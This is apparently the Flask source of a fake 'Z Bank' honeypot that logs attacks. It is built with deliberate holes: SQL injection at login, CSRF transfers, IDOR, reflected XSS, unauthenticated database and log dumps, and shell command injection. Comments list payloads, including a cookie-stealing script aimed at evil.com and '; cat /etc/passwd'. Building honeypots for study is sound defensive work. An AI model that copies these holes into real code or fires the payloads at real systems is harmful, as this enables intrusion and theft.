from flask import Flask, request, render_template, jsonify, session, redirect, make_response, send_file
import json
import uuid
import sqlite3
import hashlib
import os
from datetime import datetime, timedelta

app = Flask(__name__)
app.secret_key = "zbank_honeypot_secret_key_2026"

DB_PATH = "/data/zbank.db"

# ===== SESSION HELPERS =====
# Using DB-based sessions to fix Docker/Windows cookie issues

def get_session_token():
    """Get session token from cookie OR query param"""
    token = request.cookies.get("zbank_token")
    if not token:
        token = request.args.get("token")
    return token

def get_logged_in_user():
    """Get user from DB session token"""
    token = get_session_token()
    if not token:
        return None
    conn = get_db()
    sess = conn.execute(
        "SELECT * FROM sessions WHERE session_token = ? AND is_active = 1",
        (token,)
    ).fetchone()
    if not sess:
        conn.close()
        return None
    user = conn.execute(
        "SELECT * FROM users WHERE id = ?",
        (sess["user_id"],)
    ).fetchone()
    conn.close()
    return dict(user) if user else None

def require_login():
    """Check if user is logged in via DB session"""
    return get_logged_in_user() is not None

def detect_sqli(value):
    """Detect common SQL injection patterns in input"""
    patterns = [
        "'", '"', "--", ";--", "/*", "*/",
        "OR 1=1", "or 1=1", "' OR '", "' or '",
        "UNION", "union select", "SELECT *",
        "DROP TABLE", "1=1", "admin'--",
        "SLEEP(", "BENCHMARK(", "xp_cmdshell",
        "' OR 1", "OR '1'='1", "or '1'='1"
    ]
    return any(p.lower() in value.lower() for p in patterns)

def set_session_cookie(response, token):
    """Set session cookie with all possible options"""
    response.set_cookie(
        "zbank_token",
        token,
        max_age=86400,
        samesite=None,
        httponly=False,
        secure=False,
        path="/"
    )
    return response

DB_PATH = "/data/zbank.db"

# ===== DATABASE =====

def get_db():
    os.makedirs("/data", exist_ok=True)
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    return conn

def hash_password(password):
    return hashlib.sha256(password.encode()).hexdigest()

def init_db():
    conn = get_db()
    c = conn.cursor()

    c.execute('''CREATE TABLE IF NOT EXISTS users (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        username TEXT UNIQUE NOT NULL,
        password TEXT NOT NULL,
        full_name TEXT,
        email TEXT,
        account_number TEXT,
        balance REAL DEFAULT 0,
        account_type TEXT DEFAULT 'savings',
        phone TEXT,
        address TEXT,
        member_since TEXT
    )''')

    c.execute('''CREATE TABLE IF NOT EXISTS transactions (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        user_id INTEGER NOT NULL,
        type TEXT NOT NULL,
        amount REAL NOT NULL,
        description TEXT,
        from_account TEXT,
        to_account TEXT,
        balance_after REAL,
        timestamp TEXT,
        status TEXT DEFAULT 'completed',
        category TEXT
    )''')

    c.execute('''CREATE TABLE IF NOT EXISTS attack_logs (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        timestamp TEXT,
        ip_address TEXT,
        attack_type TEXT,
        username_tried TEXT,
        password_tried TEXT,
        target_user_id TEXT,
        endpoint TEXT,
        service TEXT,
        severity TEXT,
        details TEXT,
        user_agent TEXT,
        session_id TEXT
    )''')

    c.execute('''CREATE TABLE IF NOT EXISTS sessions (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        session_token TEXT UNIQUE,
        user_id INTEGER,
        username TEXT,
        ip_address TEXT,
        login_time TEXT,
        last_active TEXT,
        is_active INTEGER DEFAULT 1
    )''')

    # Seed bait users
    bait_users = [
        (1, "john.anderson", hash_password("john123"),
         "John Anderson", "john.anderson@zbank.com",
         "ACC-4521-XXXX", 24350.00, "savings",
         "+1 (555) 842-3901", "142 Oak Street, New York, NY 10001", "January 2019"),
        (2, "sarah.k", hash_password("sarah123"),
         "Sarah Kim", "sarah.k@zbank.com",
         "ACC-8821-XXXX", 15200.50, "current",
         "+1 (555) 234-5678", "88 Park Avenue, New York, NY 10022", "March 2020"),
        (3, "mike.chen", hash_password("mike123"),
         "Mike Chen", "mike.chen@zbank.com",
         "ACC-3392-XXXX", 8750.00, "savings",
         "+1 (555) 345-6789", "55 Broadway, New York, NY 10006", "July 2021"),
    ]

    for user in bait_users:
        c.execute('''INSERT OR IGNORE INTO users
            (id, username, password, full_name, email, account_number,
             balance, account_type, phone, address, member_since)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)''', user)

    # Seed transactions
    seed_transactions = [
        (1, "credit", 5200.00, "Salary Credit — TechCorp Ltd", "TechCorp Ltd",
         "ACC-4521-XXXX", 24350.00, "2026-04-22T09:00:00Z", "completed", "Income"),
        (1, "debit", 14.99, "Amazon Prime Subscription", "ACC-4521-XXXX",
         "Amazon", 19150.00, "2026-04-21T14:15:00Z", "completed", "Subscription"),
        (1, "debit", 500.00, "Fund Transfer — Sarah Kim", "ACC-4521-XXXX",
         "ACC-8821-XXXX", 18650.00, "2026-04-20T11:30:00Z", "completed", "Transfer"),
        (1, "debit", 85.50, "Electricity Bill Payment", "ACC-4521-XXXX",
         "City Electric", 18564.50, "2026-04-19T08:45:00Z", "completed", "Utilities"),
        (1, "debit", 200.00, "ATM Withdrawal", "ACC-4521-XXXX",
         "ATM #4821", 18364.50, "2026-04-18T15:20:00Z", "pending", "Cash"),
        (1, "debit", 1200.00, "Rent Payment — April 2026", "ACC-4521-XXXX",
         "Oak Street Properties", 17164.50, "2026-04-17T09:00:00Z", "completed", "Housing"),
        (1, "debit", 25.00, "Mobile Recharge", "ACC-4521-XXXX",
         "Verizon", 17139.50, "2026-04-15T18:10:00Z", "completed", "Mobile"),
        (2, "credit", 4800.00, "Salary Credit — DesignCo", "DesignCo LLC",
         "ACC-8821-XXXX", 15200.50, "2026-04-22T09:00:00Z", "completed", "Income"),
        (2, "credit", 500.00, "Received Transfer — John Anderson", "ACC-4521-XXXX",
         "ACC-8821-XXXX", 10400.50, "2026-04-20T11:35:00Z", "completed", "Transfer"),
        (2, "debit", 320.00, "Online Shopping — Zara", "ACC-8821-XXXX",
         "Zara Store", 9900.50, "2026-04-21T16:00:00Z", "completed", "Shopping"),
        (2, "debit", 65.00, "Netflix & Spotify", "ACC-8821-XXXX",
         "Subscriptions", 9835.50, "2026-04-20T08:00:00Z", "completed", "Subscription"),
        (2, "debit", 450.00, "Grocery Shopping", "ACC-8821-XXXX",
         "Whole Foods", 9385.50, "2026-04-18T12:30:00Z", "completed", "Food"),
        (2, "debit", 800.00, "Rent — April 2026", "ACC-8821-XXXX",
         "Park Avenue Realty", 8585.50, "2026-04-17T09:00:00Z", "completed", "Housing"),
        (3, "credit", 3200.00, "Freelance Payment — StartupXYZ", "StartupXYZ Inc",
         "ACC-3392-XXXX", 8750.00, "2026-04-22T10:00:00Z", "completed", "Income"),
        (3, "debit", 950.00, "Rent — April 2026", "ACC-3392-XXXX",
         "Broadway Apartments", 5550.00, "2026-04-17T09:00:00Z", "completed", "Housing"),
        (3, "debit", 180.00, "Grocery & Dining", "ACC-3392-XXXX",
         "Various", 5370.00, "2026-04-21T19:00:00Z", "completed", "Food"),
        (3, "debit", 55.00, "Internet Bill", "ACC-3392-XXXX",
         "Comcast", 5315.00, "2026-04-19T08:00:00Z", "completed", "Utilities"),
        (3, "debit", 200.00, "ATM Withdrawal", "ACC-3392-XXXX",
         "ATM #1234", 5115.00, "2026-04-18T14:00:00Z", "completed", "Cash"),
        (3, "credit", 500.00, "Client Bonus", "ClientABC",
         "ACC-3392-XXXX", 5615.00, "2026-04-16T11:00:00Z", "completed", "Income"),
        (3, "debit", 89.99, "Adobe Creative Cloud", "ACC-3392-XXXX",
         "Adobe", 5525.00, "2026-04-15T08:00:00Z", "completed", "Subscription"),
    ]

    for txn in seed_transactions:
        c.execute('''INSERT OR IGNORE INTO transactions
            (user_id, type, amount, description, from_account,
             to_account, balance_after, timestamp, status, category)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)''', txn)

    conn.commit()
    conn.close()
    print("[DB] Database initialized with bait users and transactions!")

def log_attack(attack_type, severity, details="", username_tried="",
               password_tried="", target_user_id="", endpoint="",
               service="banking-portal"):
    """Log attack to SQLite database AND file for ELK"""
    conn = get_db()
    timestamp = datetime.utcnow().isoformat() + "Z"

    conn.execute('''INSERT INTO attack_logs
        (timestamp, ip_address, attack_type, username_tried, password_tried,
         target_user_id, endpoint, service, severity, details, user_agent, session_id)
        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)''', (
        timestamp, request.remote_addr, attack_type,
        username_tried, password_tried, str(target_user_id),
        endpoint, service, severity, details,
        request.headers.get("User-Agent", ""), str(uuid.uuid4())
    ))
    conn.commit()
    conn.close()

    # Also write to log file for ELK
    log_entry = {
        "event_id": str(uuid.uuid4()),
        "timestamp": timestamp,
        "honeypot_service": service,
        "source_ip": request.remote_addr,
        "attack_type": attack_type,
        "username": username_tried,
        "password": password_tried,
        "endpoint": endpoint,
        "severity": severity,
        "details": details,
        "protocol": "HTTP",
        "environment": "honeypot-finance",
        "project": "PRJN26-213"
    }
    os.makedirs("/logs", exist_ok=True)
    with open("/logs/banking.log", "a") as f:
        f.write(json.dumps(log_entry) + "\n")

    print(f"[ATTACK] {attack_type} | {severity} | {request.remote_addr} | {username_tried}")

def require_login():
    """Check login via Flask session OR DB token cookie"""
    # Method 1: Flask session
    if session.get("logged_in") and session.get("user_id"):
        return True
    # Method 2: DB token cookie
    user = get_logged_in_user()
    if user:
        # Restore Flask session
        session["user_id"] = user["id"]
        session["username"] = user["username"]
        session["full_name"] = user["full_name"]
        session["logged_in"] = True
        session.permanent = True
        return True
    return False

def get_current_user():
    """Get current user dict from session or DB token"""
    # Try Flask session first
    if session.get("user_id"):
        conn = get_db()
        user = conn.execute(
            "SELECT * FROM users WHERE id = ?",
            (session["user_id"],)
        ).fetchone()
        conn.close()
        if user:
            return dict(user)
    # Try DB token
    return get_logged_in_user()

# ===== AUTH ROUTES =====

@app.route("/")
def home():
    return render_template("login.html")

@app.route("/login-page")
def login_page():
    return render_template("login_form.html")

@app.route("/register-page")
def register_page():
    return render_template("register.html")

@app.route("/login", methods=["POST"])
def login():
    username = request.form.get("username", "").strip()
    password = request.form.get("password", "").strip()
    is_sqli = detect_sqli(username) or detect_sqli(password)
    conn = get_db()

    # ── SQL INJECTION PATH ──
    if is_sqli:
        log_attack(
            attack_type="SQL_INJECTION_ATTEMPT",
            severity="HIGH",
            username_tried=username,
            password_tried=password,
            endpoint="/login",
            details=f"SQLi payload detected: username='{username}'"
        )

        user = None
        try:
            # INTENTIONALLY VULNERABLE raw query — no parameterization!
            # This is what makes SQLi work:
            #
            # john.anderson'--  → SELECT * FROM users WHERE username = 'john.anderson'--'
            #                     comment (--) removes rest → finds john ✅
            #
            # sarah.k'--        → SELECT * FROM users WHERE username = 'sarah.k'--'
            #                     finds sarah ✅
            #
            # ' OR '1'='1       → SELECT * FROM users WHERE username = '' OR '1'='1'
            #                     always true → returns all → fetchone = john ✅
            #
            # admin'--          → SELECT * FROM users WHERE username = 'admin'--'
            #                     no admin user → returns nothing → error shown ✅
            #
            raw_query = f"SELECT * FROM users WHERE username = '{username}'"
            user = conn.execute(raw_query).fetchone()

        except Exception as e:
            log_attack(
                attack_type="SQL_INJECTION_ERROR",
                severity="HIGH",
                username_tried=username,
                password_tried=password,
                endpoint="/login",
                details=f"SQL Error from injection: {str(e)} — Query was: {raw_query}"
            )
            conn.close()
            # Return the DB error to attacker intentionally — information leak!
            return render_template("login_form.html",
                                   error="wrong_password",
                                   message=f"DB Error: {str(e)}")

        if user:
            # Raw query returned a real user — bypass successful!
            log_attack(
                attack_type="SQL_INJECTION_AUTH_BYPASS",
                severity="CRITICAL",
                username_tried=username,
                password_tried=password,
                target_user_id=str(user["id"]),
                endpoint="/login",
                details=f"AUTH BYPASSED via SQLi! Payload: '{username}' → Logged in as: {user['username']}"
            )
            session["user_id"] = user["id"]
            session["username"] = user["username"]
            session["full_name"] = user["full_name"]
            session["logged_in"] = True
            session.permanent = True

            token = str(uuid.uuid4())
            conn.execute('''INSERT INTO sessions
                (session_token, user_id, username, ip_address, login_time, last_active)
                VALUES (?, ?, ?, ?, ?, ?)''', (
                token, user["id"], user["username"],
                request.remote_addr,
                datetime.utcnow().isoformat() + "Z",
                datetime.utcnow().isoformat() + "Z"
            ))
            conn.commit()
            conn.close()

            response = make_response(redirect("/dashboard"))
            response.set_cookie("zbank_token", token, max_age=86400, path="/", samesite=None, httponly=False, secure=False)
            response.set_cookie("zbank_uid", str(user["id"]), max_age=86400, path="/", samesite=None, httponly=False, secure=False)
            response.set_cookie("zbank_user", user["username"], max_age=86400, path="/", samesite=None, httponly=False, secure=False)
            return response

        else:
            # Raw query returned nothing — payload didn't match any user
            # e.g. admin'-- fails because no 'admin' user exists
            log_attack(
                attack_type="SQL_INJECTION_FAILED",
                severity="MEDIUM",
                username_tried=username,
                password_tried=password,
                endpoint="/login",
                details=f"SQLi attempted but no user matched. Payload: '{username}'"
            )
            conn.close()
            return render_template("login_form.html",
                                   error="invalid_user",
                                   message="User not found.")

    # ── NORMAL LOGIN PATH ──
    user = conn.execute(
        "SELECT * FROM users WHERE username = ?", (username,)
    ).fetchone()

    if not user:
        log_attack("LOGIN_INVALID_USER", "LOW",
                   username_tried=username, password_tried=password,
                   endpoint="/login",
                   details=f"Username '{username}' not found")
        conn.close()
        return render_template("login_form.html",
                               error="invalid_user",
                               message="User not found.")

    if user["password"] != hash_password(password):
        log_attack("LOGIN_WRONG_PASSWORD", "MEDIUM",
                   username_tried=username, password_tried=password,
                   target_user_id=user["id"], endpoint="/login",
                   details=f"Wrong password for '{username}'")
        conn.close()
        return render_template("login_form.html",
                               error="wrong_password",
                               message="Incorrect password.")

    # Bait credential used!
    log_attack("BAIT_CREDENTIAL_USED", "HIGH",
               username_tried=username, password_tried=password,
               target_user_id=user["id"], endpoint="/login",
               details=f"BAIT CREDENTIAL USED! {username} from {request.remote_addr}")

    token = str(uuid.uuid4())
    conn.execute('''INSERT INTO sessions
        (session_token, user_id, username, ip_address, login_time, last_active)
        VALUES (?, ?, ?, ?, ?, ?)''', (
        token, user["id"], username,
        request.remote_addr,
        datetime.utcnow().isoformat() + "Z",
        datetime.utcnow().isoformat() + "Z"
    ))
    conn.commit()
    conn.close()

    session["user_id"] = user["id"]
    session["username"] = username
    session["full_name"] = user["full_name"]
    session["logged_in"] = True
    session["token"] = token
    session.permanent = True

    response = make_response(redirect("/dashboard"))
    response.set_cookie("zbank_token", token, max_age=86400, path="/", samesite=None, httponly=False, secure=False)
    response.set_cookie("zbank_uid", str(user["id"]), max_age=86400, path="/", samesite=None, httponly=False, secure=False)
    response.set_cookie("zbank_user", username, max_age=86400, path="/", samesite=None, httponly=False, secure=False)
    return response

@app.route("/logout")
def logout():
    # Clear DB session
    token = request.cookies.get("zbank_token")
    if token:
        conn = get_db()
        conn.execute("UPDATE sessions SET is_active=0 WHERE session_token=?", (token,))
        conn.commit()
        conn.close()
    session.clear()
    response = make_response(redirect("/"))
    response.delete_cookie("zbank_token")
    response.delete_cookie("zbank_uid")
    response.delete_cookie("zbank_user")
    response.delete_cookie("zbank_admin")
    return response

@app.route("/register", methods=["POST"])
def register():
    data = request.get_json(silent=True) or {}
    username = data.get("username", "")
    conn = get_db()
    existing = conn.execute(
        "SELECT id FROM users WHERE username = ?", (username,)
    ).fetchone()
    conn.close()
    log_attack("REGISTRATION_ATTEMPT", "LOW",
               username_tried=username, endpoint="/register",
               details=f"Registration attempt for: {username}")
    if existing:
        # Intentional: reveals username exists — username enumeration
        return jsonify({"status": "error", "message": "Username already taken!"})
    return jsonify({"status": "success", "message": "Account created!"})

# ===== USER PAGES =====

@app.route("/dashboard")
def dashboard():
    if not require_login():
        log_attack("UNAUTHORIZED_ACCESS", "MEDIUM",
                   endpoint="/dashboard",
                   details="Attempted dashboard access without login")
        return redirect("/login-page")
    user = get_current_user()
    return render_template("dashboard.html",
                           user=user if user else {})

@app.route("/accounts")
def accounts():
    if not require_login():
        return redirect("/login-page")
    user = get_current_user()
    conn = get_db()
    txns = conn.execute(
        "SELECT * FROM transactions WHERE user_id = ? ORDER BY timestamp DESC LIMIT 10",
        (user["id"],)
    ).fetchall()
    conn.close()
    return render_template("accounts.html",
                           user=user,
                           transactions=[dict(t) for t in txns])

# ===== TRANSFER — CSRF VULNERABLE =====

@app.route("/transfer", methods=["GET"])
def transfer():
    if not require_login():
        return redirect("/login-page")
    user = get_current_user()
    return render_template("transfer.html", user=user if user else {})

@app.route("/transfer", methods=["POST"])
def transfer_post():
    """Normal transfer via JSON (from transfer form)"""
    if not require_login():
        return jsonify({"error": "unauthorized"}), 401

    user = get_current_user()
    if not user:
        return jsonify({"error": "unauthorized"}), 401

    data = request.get_json(silent=True) or {}
    amount = float(data.get("amount", 0))
    to_account = data.get("to_account", "")
    beneficiary = data.get("beneficiary_name", "Unknown")
    txn_id = str(uuid.uuid4())

    conn = get_db()
    if amount > 0 and amount <= user["balance"]:
        new_balance = round(user["balance"] - amount, 2)
        conn.execute("UPDATE users SET balance = ? WHERE id = ?",
                     (new_balance, user["id"]))
        conn.execute('''INSERT INTO transactions
            (user_id, type, amount, description, from_account,
             to_account, balance_after, timestamp, status, category)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)''', (
            user["id"], "debit", amount,
            f"Transfer to {beneficiary}",
            user["account_number"], to_account,
            new_balance,
            datetime.utcnow().isoformat() + "Z",
            "completed", "Transfer"
        ))
        conn.commit()
        log_attack("TRANSFER_EXECUTED", "HIGH",
                   username_tried=user["username"],
                   target_user_id=user["id"],
                   endpoint="/transfer",
                   details=f"Transfer ${amount} to {beneficiary} ({to_account})")
    conn.close()
    return jsonify({"status": "success", "transaction_id": txn_id})

# ===== CSRF VULNERABLE ENDPOINT =====
# No CSRF token validation — intentional vulnerability!
# Attacker can forge: /transfer/execute?to_account=ATK&beneficiary=Hacker&amount=5000
# If victim is logged in and visits this URL, transfer executes automatically!

@app.route("/transfer/execute")
def transfer_execute_csrf():
    """CSRF VULNERABILITY — No token validation!"""
    if not require_login():
        return redirect("/login-page")

    user = get_current_user()
    if not user:
        return redirect("/login-page")

    to_account = request.args.get("to_account", "")
    beneficiary = request.args.get("beneficiary", "Unknown")
    amount_str = request.args.get("amount", "0")

    try:
        amount = float(amount_str)
    except:
        amount = 0

    log_attack(
        attack_type="CSRF_ATTACK",
        severity="HIGH",
        username_tried=user["username"],
        target_user_id=user["id"],
        endpoint=f"/transfer/execute?to_account={to_account}&amount={amount}",
        details=f"CSRF ATTACK! Forged transfer ${amount} to {beneficiary} — victim: {user['username']}"
    )

    conn = get_db()
    result = {"status": "failed", "reason": "unknown"}

    if not to_account:
        result = {"status": "failed", "reason": "Missing to_account"}
    elif amount <= 0:
        result = {"status": "failed", "reason": "Invalid amount"}
    elif amount <= user["balance"]:
        new_balance = round(user["balance"] - amount, 2)
        conn.execute("UPDATE users SET balance = ? WHERE id = ?",
                     (new_balance, user["id"]))
        conn.execute('''INSERT INTO transactions
            (user_id, type, amount, description, from_account,
             to_account, balance_after, timestamp, status, category)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)''', (
            user["id"], "debit", amount,
            f"CSRF Transfer to {beneficiary}",
            user["account_number"], to_account,
            new_balance,
            datetime.utcnow().isoformat() + "Z",
            "completed", "CSRF-Transfer"
        ))
        conn.commit()
        result = {
            "status": "success",
            "message": f"CSRF transfer of ${amount} executed!",
            "victim": user["username"],
            "victim_balance_before": user["balance"],
            "new_balance": new_balance,
            "amount_stolen": amount,
            "transferred_to": to_account,
            "transaction_id": str(uuid.uuid4()),
            "warning": "⚠️ CSRF Attack Successful — No user interaction required!"
        }
    else:
        result = {"status": "failed", "reason": "Insufficient balance"}

    conn.close()
    return jsonify(result)

# ===== PROFILE — IDOR VULNERABLE =====

@app.route("/profile")
def profile():
    if not require_login():
        return redirect("/login-page")

    current_user = get_current_user()
    if not current_user:
        return redirect("/login-page")

    # IDOR vulnerability — attacker changes ?id= to access any user!
    requested_id = request.args.get("id", current_user["id"])
    is_own_profile = str(requested_id) == str(current_user["id"])

    if not is_own_profile:
        log_attack(
            attack_type="IDOR_PROFILE",
            severity="HIGH",
            username_tried=current_user["username"],
            target_user_id=requested_id,
            endpoint=f"/profile?id={requested_id}",
            details=f"IDOR! {current_user['username']} accessed profile of user_id={requested_id}"
        )

    conn = get_db()
    target_user = conn.execute(
        "SELECT * FROM users WHERE id = ?", (requested_id,)
    ).fetchone()
    conn.close()

    if not target_user:
        return redirect("/profile")

    return render_template("profile.html",
                           user=dict(target_user),
                           is_own_profile=is_own_profile)

# ===== TRANSACTIONS — IDOR VULNERABLE =====

@app.route("/transactions")
def transactions():
    if not require_login():
        return redirect("/login-page")

    current_user = get_current_user()
    if not current_user:
        return redirect("/login-page")

    # IDOR vulnerability — attacker can view ANY user's transactions!
    requested_user_id = request.args.get("user_id", current_user["id"])
    is_own = str(requested_user_id) == str(current_user["id"])

    if not is_own:
        log_attack(
            attack_type="IDOR_TRANSACTIONS",
            severity="HIGH",
            username_tried=current_user["username"],
            target_user_id=requested_user_id,
            endpoint=f"/transactions?user_id={requested_user_id}",
            details=f"IDOR! {current_user['username']} accessed transactions of user_id={requested_user_id}"
        )

    conn = get_db()
    user = conn.execute(
        "SELECT * FROM users WHERE id = ?", (requested_user_id,)
    ).fetchone()
    txns = conn.execute(
        "SELECT * FROM transactions WHERE user_id = ? ORDER BY timestamp DESC",
        (requested_user_id,)
    ).fetchall()
    conn.close()

    if not user:
        return redirect("/transactions")

    total_credit = sum(t["amount"] for t in txns if t["type"] == "credit")
    total_debit = sum(t["amount"] for t in txns if t["type"] == "debit")
    net = round(total_credit - total_debit, 2)

    return render_template("transactions.html",
                           user=dict(user),
                           transactions=[dict(t) for t in txns],
                           total_credit=total_credit,
                           total_debit=total_debit,
                           net=net,
                           is_own=is_own)

@app.route("/cards")
def cards():
    if not require_login():
        return redirect("/login-page")
    user = get_current_user()
    return render_template("cards.html", user=user if user else {})

@app.route("/support")
def support():
    return render_template("support.html")

@app.route("/investments")
def investments():
    return render_template("coming_soon.html")

@app.route("/business-loans")
def business_loans():
    return render_template("coming_soon.html")

@app.route("/privacy")
def privacy():
    return render_template("privacy.html")

@app.route("/terms")
def terms():
    return render_template("terms.html")

@app.route("/api/docs")
def api_docs():
    log_attack("API_DOCS_ACCESS", "LOW",
               endpoint="/api/docs",
               details="Attacker accessed API documentation explorer")
    return render_template("api_docs.html")

# ===== VULNERABILITY 1 — XSS (Cross Site Scripting) =====
# Reflects user input directly in response without sanitization!
# Payload: <script>alert('XSS')</script>
# Payload: <img src=x onerror="alert('XSS')">
# Payload: <script>document.location='http://evil.com?c='+document.cookie</script>

@app.route("/search")
def xss_search():
    """
    XSS VULNERABLE search endpoint
    Reflects input directly into HTML without sanitization!
    """
    q = request.args.get("q", "")

    if q:
        # Detect XSS patterns
        xss_patterns = ["<script", "<img", "<svg", "onerror=",
                        "onload=", "javascript:", "alert(", "document.cookie",
                        "document.location", "<iframe", "</script>"]
        is_xss = any(p.lower() in q.lower() for p in xss_patterns)

        if is_xss:
            log_attack(
                attack_type="XSS_ATTEMPT",
                severity="HIGH",
                endpoint=f"/search?q={q}",
                details=f"XSS payload detected: '{q}'"
            )
        else:
            log_attack(
                attack_type="SEARCH_ACCESS",
                severity="LOW",
                endpoint=f"/search?q={q}",
                details=f"Search query: '{q}'"
            )

    # INTENTIONALLY VULNERABLE — raw input reflected in response!
    # No sanitization — attacker's script executes in victim's browser
    return f"""<!DOCTYPE html>
<html>
<head>
    <title>Z Bank Search</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&family=Syne:wght@800&display=swap" rel="stylesheet">
    <style>
        body{{font-family:'Inter',sans-serif;background:#050505;color:#e8e8e8;min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:40px;}}
        .logo{{font-family:'Syne',sans-serif;font-size:18px;font-weight:800;letter-spacing:4px;color:white;margin-bottom:32px;}}
        .search-box{{width:100%;max-width:520px;background:#0f0f0f;border:1px solid rgba(255,255,255,0.08);border-radius:14px;padding:28px;}}
        h2{{font-size:17px;font-weight:700;margin-bottom:20px;}}
        form{{display:flex;gap:10px;margin-bottom:20px;}}
        input{{flex:1;padding:11px 16px;background:rgba(255,255,255,0.05);border:1px solid rgba(255,255,255,0.1);border-radius:10px;font-size:14px;color:white;outline:none;font-family:'Inter',sans-serif;}}
        button{{padding:11px 20px;background:white;color:black;border:none;border-radius:10px;font-size:13px;font-weight:700;cursor:pointer;font-family:'Inter',sans-serif;}}
        button:hover{{background:#c8f135;}}
        .result{{background:rgba(255,255,255,0.03);border:1px solid rgba(255,255,255,0.06);border-radius:10px;padding:16px;font-size:13px;color:rgba(255,255,255,0.55);}}
        .result strong{{color:#c8f135;}}
        a{{color:rgba(255,255,255,0.35);font-size:13px;text-decoration:none;display:block;margin-top:16px;}}
        a:hover{{color:white;}}
    </style>
</head>
<body>
    <div class="logo">Z BANK</div>
    <div class="search-box">
        <h2>Account Search</h2>
        <form method="GET" action="/search">
            <input type="text" name="q" value="{q}" placeholder="Search accounts, transactions..."/>
            <button type="submit">Search</button>
        </form>
        {'<div class="result">Showing results for: <strong>' + q + '</strong></div>' if q else '<div class="result">Enter a search query above.</div>'}
    </div>
    <a href="/dashboard">← Back to Dashboard</a>
</body>
</html>"""

# ===== VULNERABILITY 2 — SENSITIVE DATA EXPOSURE =====
# Exposes raw database, logs, and all user data!

@app.route("/backup/database")
def expose_database():
    """
    CRITICAL DATA EXPOSURE — Serves the raw SQLite database file!
    Attacker can download and open it with any SQLite viewer
    to see ALL users, passwords, transactions, and attack logs!
    """
    log_attack(
        attack_type="DATA_EXPOSURE_DATABASE",
        severity="CRITICAL",
        endpoint="/backup/database",
        details=f"CRITICAL! Attacker downloaded raw SQLite database file from {request.remote_addr}"
    )
    try:
        return send_file(
            DB_PATH,
            mimetype="application/octet-stream",
            as_attachment=True,
            download_name="zbank_backup.db"
        )
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route("/api/export")
def expose_all_data():
    """
    DATA EXPOSURE — Dumps ALL user data without authentication!
    Returns complete user records including hashed passwords
    """
    log_attack(
        attack_type="DATA_EXPOSURE_API",
        severity="CRITICAL",
        endpoint="/api/export",
        details=f"CRITICAL! Full database dump via unauthenticated API from {request.remote_addr}"
    )
    conn = get_db()
    users = conn.execute("SELECT * FROM users").fetchall()
    transactions = conn.execute("SELECT * FROM transactions").fetchall()
    attacks = conn.execute(
        "SELECT * FROM attack_logs ORDER BY timestamp DESC LIMIT 50"
    ).fetchall()
    conn.close()

    return jsonify({
        "warning": "SENSITIVE DATA EXPOSURE — This endpoint should not be public!",
        "users": [dict(u) for u in users],
        "transactions": [dict(t) for t in transactions],
        "recent_attacks": [dict(a) for a in attacks],
        "total_users": len(users),
        "total_transactions": len(transactions)
    })

@app.route("/logs")
def expose_logs():
    """
    DATA EXPOSURE — Serves raw application logs!
    Attacker can see all attack events, IPs, and credentials
    """
    log_attack(
        attack_type="DATA_EXPOSURE_LOGS",
        severity="HIGH",
        endpoint="/logs",
        details=f"Attacker accessed raw application logs from {request.remote_addr}"
    )
    try:
        with open("/logs/banking.log", "r") as f:
            content = f.read()
        return f"""<!DOCTYPE html>
<html>
<head>
    <title>Z Bank — Application Logs</title>
    <style>
        body{{font-family:monospace;background:#060606;color:#c8f135;padding:30px;font-size:12px;line-height:1.6;}}
        h1{{font-size:16px;margin-bottom:20px;color:white;}}
        pre{{white-space:pre-wrap;word-break:break-all;}}
        a{{color:rgba(255,255,255,0.4);text-decoration:none;font-size:13px;display:block;margin-bottom:20px;}}
    </style>
</head>
<body>
    <a href="/dashboard">← Back</a>
    <h1>Z Bank — Application Log</h1>
    <pre>{content}</pre>
</body>
</html>"""
    except:
        return jsonify({"error": "Log file not found"}), 404

# ===== VULNERABILITY 3 — COMMAND INJECTION =====
# Runs OS commands on the server!
# Normal: /api/ping?host=google.com
# Attack: /api/ping?host=google.com; whoami
# Attack: /api/ping?host=; cat /etc/passwd
# Attack: /api/ping?host=; ls -la /

@app.route("/api/ping")
def command_injection():
    """
    COMMAND INJECTION VULNERABLE endpoint!
    Passes user input directly to OS command without sanitization!

    Normal usage: /api/ping?host=google.com
    Attack: /api/ping?host=google.com; whoami
    Attack: /api/ping?host=; cat /etc/passwd
    Attack: /api/ping?host=x; ls -la
    Attack: /api/ping?host=x; env
    """
    host = request.args.get("host", "")

    if not host:
        return jsonify({
            "usage": "/api/ping?host=<hostname>",
            "example": "/api/ping?host=google.com",
            "note": "Network diagnostic tool — for internal use"
        })

    # Detect command injection patterns
    inject_patterns = [";", "&&", "||", "|", "`", "$(",
                       "$(", "cat ", "ls ", "whoami", "id ",
                       "pwd", "env", "passwd", "shadow",
                       "rm ", "wget ", "curl ", "bash", "sh "]
    is_injection = any(p.lower() in host.lower() for p in inject_patterns)

    if is_injection:
        log_attack(
            attack_type="COMMAND_INJECTION",
            severity="CRITICAL",
            endpoint=f"/api/ping?host={host}",
            details=f"COMMAND INJECTION! Payload: '{host}' executed on server from {request.remote_addr}"
        )
    else:
        log_attack(
            attack_type="PING_TOOL_ACCESS",
            severity="LOW",
            endpoint=f"/api/ping?host={host}",
            details=f"Network ping tool accessed: host='{host}'"
        )

    import subprocess
    output = ""
    error = ""

    try:
        # INTENTIONALLY VULNERABLE — user input passed directly to shell!
        # This allows command injection via ; && || operators
        result = subprocess.run(
            f"ping -c 2 {host}",
            shell=True,          # shell=True is the vulnerability!
            capture_output=True,
            text=True,
            timeout=8
        )
        output = result.stdout
        error = result.stderr
    except subprocess.TimeoutExpired:
        output = "Request timed out"
    except Exception as e:
        error = str(e)

    return jsonify({
        "host": host,
        "command": f"ping -c 2 {host}",
        "output": output,
        "error": error,
        "note": "Network diagnostic — internal use only"
    })

# ===== INTENTIONAL VULNERABILITY — robots.txt =====
